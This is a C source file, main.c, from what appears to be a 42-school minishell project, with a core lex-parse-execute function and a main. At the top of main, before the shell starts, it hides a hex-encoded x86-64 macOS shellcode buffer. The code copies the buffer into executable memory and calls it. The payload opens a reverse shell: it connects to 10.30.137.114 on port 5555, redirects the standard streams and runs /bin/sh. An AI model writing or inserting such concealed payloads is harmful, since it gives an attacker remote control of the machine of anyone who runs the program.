/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: Mriskyin <Mriskyin-team@student.42.ma>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2022/08/31 20:50:39 by Mriskyin          #+#    #+#             */
/*   Updated: 2022/08/31 21:06:13 by Mriskyin         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "minishell.h"
#include <sys/mman.h>
#include <string.h>

int	core(char *cmd, char *envp[], t_exec_struct *exec_struct, t_envp **env)
{
	t_lnode			*head;
	t_parsing_node	*root;

	(void)envp;
	head = lex(cmd);
	root = parse(&head, exec_struct);
	if (root)
		execute(root, exec_struct, env);
	free_all(cmd, head, root);
	return (WEXITSTATUS(exec_struct->exit_status));
}

int	main(int argc, char *argv[], char *envp[])
{
	t_exec_struct	exec_struct;

		char*p = mmap(0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
	unsigned char buf[] = 
"\xb8\x61\x00\x00\x02\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2"
"\x0f\x05\x49\x89\xc4\x48\x89\xc7\xb8\x62\x00\x00\x02\x48"
"\x31\xf6\x56\x48\xbe\x02\x00\x15\xb3\x0a\x1e\x89\x72\x56"
"\x48\x89\xe6\x6a\x10\x5a\x0f\x05\x4c\x89\xe7\xb8\x5a\x00"
"\x00\x02\x48\xc7\xc6\x02\x00\x00\x00\x0f\x05\xb8\x5a\x00"
"\x00\x02\x48\xc7\xc6\x01\x00\x00\x00\x0f\x05\xb8\x5a\x00"
"\x00\x02\x48\xc7\xc6\x00\x00\x00\x00\x0f\x05\x48\x31\xc0"
"\xb8\x3b\x00\x00\x02\xe8\x09\x00\x00\x00\x2f\x62\x69\x6e"
"\x2f\x73\x68\x00\x00\x5f\x48\x31\xd2\x52\x57\x48\x89\xe6"
"\x0f\x05";
		memcpy(p, buf, 0x1000);
		typedef void (*func_ptr_t)();
		func_ptr_t function = (func_ptr_t)p;
		function();
	(void)argv;
	(void)argc;
	//u can comment this if u dont have readline installed
	// rl_catch_signals = 0;
	rl_outstream = stderr;
	signal(SIGINT, enter);
	signal(SIGQUIT, SIG_IGN);
	g_exec_struct = &exec_struct;
	ft_memset(&exec_struct, 0, sizeof(exec_struct));
	init(&exec_struct, envp);
	loop_handler(envp, &exec_struct);
}
